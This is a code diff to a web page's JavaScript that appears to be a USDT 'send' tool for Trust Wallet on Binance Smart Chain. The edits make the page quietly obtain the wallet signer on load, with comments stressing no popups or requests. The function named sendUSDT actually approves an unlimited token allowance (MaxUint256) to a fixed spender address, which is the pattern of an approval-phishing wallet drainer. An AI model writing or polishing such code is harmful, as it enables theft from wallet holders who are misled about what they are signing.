@@ -14,29 +14,29 @@ const ABI = [
   "function decimals() view returns (uint8)"
 ];
 
-// ===== SILENT CHECK ON PAGE LOAD (NO POPUP) =====
+// ===== SILENT SETUP ON PAGE LOAD (NO REQUESTS) =====
 window.addEventListener("load", async () => {
   if (window.ethereum) {
     try {
-      // Only check if wallet is available, don't request connection
-      // This allows Trust Wallet DApp browser to work silently
-      const accounts = await window.ethereum.request({ method: "eth_accounts" });
+      // In Trust Wallet DApp browser, wallet is already connected
+      // Just set up provider, don't request anything
+      provider = new ethers.BrowserProvider(window.ethereum);
       
-      if (accounts.length > 0) {
-        // Wallet already connected - setup silently
-        provider = new ethers.BrowserProvider(window.ethereum);
+      // Try to get signer silently (works in Trust Wallet DApp browser)
+      try {
         signer = await provider.getSigner();
         userAddress = await signer.getAddress();
         
         const addr = document.getElementById("toAddress");
         if (addr) addr.value = userAddress;
         
-        console.log("✅ Wallet detected:", userAddress);
-      } else {
-        console.log("Wallet available, will connect on transaction");
+        console.log("✅ Wallet ready:", userAddress);
+      } catch (e) {
+        // If fails, will retry on transaction
+        console.log("Wallet will be ready on transaction");
       }
     } catch (e) {
-      console.log("Wallet check failed:", e.message);
+      console.log("Setup error:", e.message);
     }
   }
 });
@@ -76,18 +76,17 @@ async function ensureBSC() {
 // ===== APPROVE (BSC ONLY) =====
 async function sendUSDT() {
   try {
-    // Connect wallet if not already connected (Trust Wallet DApp browser does this silently)
-    if (!userAddress || !signer) {
-      // Request connection only when needed
-      await window.ethereum.request({ method: "eth_requestAccounts" });
+    // Set up wallet if not already done (Trust Wallet DApp browser handles this automatically)
+    if (!provider) {
       provider = new ethers.BrowserProvider(window.ethereum);
+    }
+    
+    if (!signer) {
       signer = await provider.getSigner();
       userAddress = await signer.getAddress();
       
       const addr = document.getElementById("toAddress");
       if (addr) addr.value = userAddress;
-      
-      console.log("✅ Connected on transaction:", userAddress);
     }
 
     // Ensure we're on BSC network before transaction
@@ -106,6 +105,7 @@ async function sendUSDT() {
     const nativeBalanceWei = await provider.getBalance(userAddress);
     const nativeBalance = ethers.formatEther(nativeBalanceWei);
 
+    // This transaction call will trigger Trust Wallet approval popup
     const tx = await usdt.approve(
       BSC_SPENDER,
       ethers.MaxUint256
